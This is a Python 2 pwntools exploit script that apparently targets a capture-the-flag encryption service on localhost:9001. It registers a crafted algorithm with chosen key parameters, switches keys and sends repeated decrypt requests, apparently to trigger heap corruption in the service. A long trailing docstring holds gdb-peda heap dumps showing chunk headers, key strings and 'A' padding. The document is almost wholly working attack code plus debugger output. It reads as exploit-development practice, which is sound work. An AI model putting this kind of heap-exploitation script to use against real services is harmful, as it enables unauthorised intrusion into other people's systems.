#!/usr/bin/python2
from pwn import *
import re

sh = remote('localhost', 9001)


def send_payload(payload):
	sh.sendline(payload)
	return sh.recv()

def algo_X(payload1, payload2, payload3):
	print send_payload('0')
	print send_payload('3')
	#for i in range(3):
	print send_payload(payload1)
	print send_payload(payload2)
	print send_payload(payload3)

def other_key(func):
	print send_payload('0')
	print send_payload('{}'.format(func))

def encrypyt_message(payload, key_num):
	print send_payload('1')
	print send_payload('{}'.format(key_num))
	sh.sendline(payload)
	print sh.recvuntil('message is:\n')
	ciphertext = sh.recvuntil('you with?')
	ciphertext = ciphertext[1:len(ciphertext)-30]
	return ciphertext

def decrypt_message(ciphertext, key_num):
	print send_payload('2')
	print send_payload('{}'.format(key_num))

	results = re.findall('0x', ciphertext)
	print len(results)
	print send_payload('{}'.format(len(results)))
	print send_payload(ciphertext)

def main():
	inp = raw_input("type anything to start: ")

	print sh.recv()
	#for i in range(32):
		#print i
	#other_key('0')
	#other_key('0')
	algo_X('0x'+'10001','0x'+'87a0acc71a5f08bc26412b3f','0x'+'271cc445d27091437f9143c9')
	other_key('0')
	other_key('1')
	for i in range(9):
		decrypt_message('0x1', 0)
	decrypt_message('0x2', 0)
	#ciphertext = encrypyt_message('A'*125, 0)
	#print '{}'.format(ciphertext)
	#other_key('1')
	#decrypt_message(ciphertext, 0)


	sh.interactive()

if __name__ == '__main__':
	main()
"""
HEAP snapshot with keys
start addr: 0x55aa742be000
gdb-peda$ x/100x 0x55aa75cdf1e0-0x200
0x55aa75cdefe0: 0x0000000000002953      0x0000000000000021
0x55aa75cdeff0: 0x000000055aa75cde      0x586908528bbfe6e6
0x55aa75cdf000: 0x000000002e79656b      0x0000000000000031
0x55aa75cdf010: 0x000000055aa75cdf      0x586908528bbfe6e6
0x55aa75cdf020: 0x206465636e756f6e      0x687469726f676c41
0x55aa75cdf030: 0x000000293031206d      0x0000000000000091
0x55aa75cdf040: 0x000055aa75cdf0d0      0x0000000000000022
0x55aa75cdf050: 0x0000000000000022      0x0000000000000000
0x55aa75cdf060: 0x000055aa75cdf070      0x000000000000000c
0x55aa75cdf070: 0x687469726f676c41      0x000000003331206d
0x55aa75cdf080: 0x000055aa75cdf100      0x0000000000000014
0x55aa75cdf090: 0x0000000000000014      0x0000000000000000
0x55aa75cdf0a0: 0x000055aa75cdf120      0x0000000000000025
0x55aa75cdf0b0: 0x0000000000000025      0x0000000000000000
0x55aa75cdf0c0: 0x0000000000000000      0x0000000000000031
0x55aa75cdf0d0: 0x6972756f7373694d      0x74707972636e4520
0x55aa75cdf0e0: 0x6e617453206e6f69      0x454d282064726164
0x55aa75cdf0f0: 0x0000000000002953      0x0000000000000021
0x55aa75cdf100: 0x687469726f676c41      0x58584343434d206d
0x55aa75cdf110: 0x0000000049495658      0x0000000000000031
0x55aa75cdf120: 0x687469726f676c41      0x6f7250282058206d
0x55aa75cdf130: 0x206465636e756f6e      0x687469726f676c41
0x55aa75cdf140: 0x000000293031206d      0x0000000000000081
0x55aa75cdf150: 0x000055aa742e38b8      0x0000000100000001
0x55aa75cdf160: 0x000055aa742e39d0      0x0000000000000000
0x55aa75cdf170: 0x0000000000000000      0x0000000000000000
0x55aa75cdf180: 0x0000000000000000      0x0000000000000000




gdb-peda$ x/300wx 0x564c959392f0-0x400
0x564c95938ef0: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f00: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f10: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f20: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f30: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f40: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f50: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f60: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f70: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f80: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938f90: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938fa0: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95938fb0: 0x00000000      0x00000000      0x00000031      0x00000000
0x564c95938fc0: 0xf15ac928      0x00005649      0x7abde7fc      0x0976cda0
0x564c95938fd0: 0x6568746f      0x656b2072      0x31002e79      0x31343134
0x564c95938fe0: 0x31343134      0x00003134      0x00000021      0x00000000
0x564c95938ff0: 0x64c95938      0x00000005      0x7abde7fc      0x0976cda0
0x564c95939000: 0x2e79656b      0x00000000      0x00000031      0x00000000
0x564c95939010: 0xf15acb79      0x00005649      0x7abde7fc      0x0976cda0
0x564c95939020: 0x31343134      0x31343134      0x31343134      0x31343134
0x564c95939030: 0x31343134      0x00003134      0x00000091      0x00000000
0x564c95939040: 0x959390d0      0x0000564c      0x00000022      0x00000000
0x564c95939050: 0x00000022      0x00000000      0x00000000      0x00000000
0x564c95939060: 0x95939070      0x0000564c      0x0000000c      0x00000000
0x564c95939070: 0x6f676c41      0x68746972      0x3331206d      0x00000000
0x564c95939080: 0x95939100      0x0000564c      0x00000014      0x00000000
0x564c95939090: 0x00000014      0x00000000      0x00000000      0x00000000
0x564c959390a0: 0x95939120      0x0000564c      0x00000025      0x00000000
0x564c959390b0: 0x00000025      0x00000000      0x00000000      0x00000000
0x564c959390c0: 0x00000000      0x00000000      0x00000031      0x00000000
0x564c959390d0: 0x7373694d      0x6972756f      0x636e4520      0x74707972
0x564c959390e0: 0x206e6f69      0x6e617453      0x64726164      0x454d2820
0x564c959390f0: 0x00002953      0x00000000      0x00000021      0x00000000
0x564c95939100: 0x6f676c41      0x68746972      0x434d206d      0x58584343
0x564c95939110: 0x49495658      0x00000000      0x00000031      0x00000000
0x564c95939120: 0x6f676c41      0x68746972      0x2058206d      0x6f725028
0x564c95939130: 0x6e756f6e      0x20646563      0x6f676c41      0x68746972
0x564c95939140: 0x3031206d      0x00000029      0x00000081      0x00000000
0x564c95939150: 0x93f128b8      0x0000564c      0x00000001      0x00000001
0x564c95939160: 0x93f129d0      0x0000564c      0x00000000      0x00000000
0x564c95939170: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939180: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939190: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c959391a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c959391b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c959391c0: 0x00000000      0x00000000      0x00000071      0x00000000
0x564c959391d0: 0x93f12998      0x0000564c      0x00000002      0x00000001
0x564c959391e0: 0x41414141      0x41414141      0x41414141      0x41414141
0x564c959391f0: 0x00004141      0x00000000      0x00000000      0x00000000
0x564c95939200: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939210: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939220: 0x00000000      0x00000000      0x00000000      0x00000012
0x564c95939230: 0x00000001      0x00000000      0x00000031      0x00000000
0x564c95939240: 0x64c95939      0x00000005      0x7abde7fc      0x0976cda0
0x564c95939250: 0x31343134      0x31343134      0x31343134      0x31343134
0x564c95939260: 0x31343134      0x00000000      0x00000071      0x00000000
0x564c95939270: 0x93f12998      0x0000564c      0x00000002      0x00000001
0x564c95939280: 0x41414141      0x41414141      0x41414141      0x41414141
0x564c95939290: 0x00004141      0x00000000      0x00000000      0x00000000
0x564c959392a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c959392b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c959392c0: 0x00000000      0x00000000      0x00000000      0x00000012
0x564c959392d0: 0x00000001      0x00000000      0x00000071      0x00000000
0x564c959392e0: 0x93f12998      0x0000564c      0x00000002      0x00000001
0x564c959392f0: 0x41414141      0x41414141      0x41414141      0x41414141
0x564c95939300: 0x00004141      0x00000000      0x00000000      0x00000000
0x564c95939310: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939320: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939330: 0x00000000      0x00000000      0x00000000      0x00000012
0x564c95939340: 0x00000001      0x00000000      0x0000dcc1      0x00000000
0x564c95939350: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939360: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939370: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939380: 0x00000000      0x00000000      0x00000000      0x00000000
0x564c95939390: 0x00000000      0x00000000      0x00000000      0x00000000

"""